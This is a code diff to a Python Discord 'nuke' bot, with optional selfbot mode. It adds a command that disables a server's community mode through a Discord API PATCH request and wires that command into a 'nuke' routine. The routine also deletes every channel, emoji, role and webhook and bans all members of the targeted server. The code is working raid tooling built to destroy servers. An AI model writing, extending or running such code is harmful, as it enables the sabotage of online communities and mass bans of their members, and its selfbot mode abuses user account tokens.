@@ -1018,6 +1018,25 @@ async def roleTo(ctx, member_name, *, role_name):
             await log(ctx, f'Unable to add role `{role.name}` to user `{member_.name}`.')
             raise
 
+@commands.check(checkPerm)
+@client.command(name='disableCommunityMode')
+async def disableCommunityMode(ctx):
+    if not await hasTarget(ctx):
+        return
+
+    if is_selfbot:
+        headers = {'authorization': f'{token}', 'content-type': 'application/json'}
+    else:
+        headers = {'authorization': f'Bot {token}', 'content-type': 'application/json'}
+    json = {"description": None, "features": {"0": "NEWS"}, "preferred_locale": "en-US", "public_updates_channel_id": None, 'rules_channel_id': None}
+
+    try:
+        consoleLog(f'{Fore.YELLOW}Disabling community mode', True)
+        r = requests.patch(f'https://discord.com/api/v8/guilds/{selected_server.id}', headers=headers, json=json)
+        consoleLog(f'{Fore.GREEN}Disabled community mode.', True)
+    except Exception as e:
+        consoleLog(f'{Fore.RED}Error while attempting to disable community mode, {e}', True)
+                           
 ######### Bombs #########
 @commands.check(checkPerm)
 @client.command(name='kaboom')
@@ -1340,7 +1359,7 @@ async def nuke(ctx):
         return
 
     await log(ctx, f'A nuke has been launched to `{selected_server.name}`.')
-    tasks = [deleteAllChannels(ctx), deleteAllEmojis(ctx), deleteAllRoles(ctx), banAll(ctx), deleteAllWebhooks(ctx)]
+    tasks = [disableCommunityMode(ctx), deleteAllChannels(ctx), deleteAllEmojis(ctx), deleteAllRoles(ctx), banAll(ctx), deleteAllWebhooks(ctx)]
     await asyncio.gather(*tasks)
 
     if len(after) > 0:
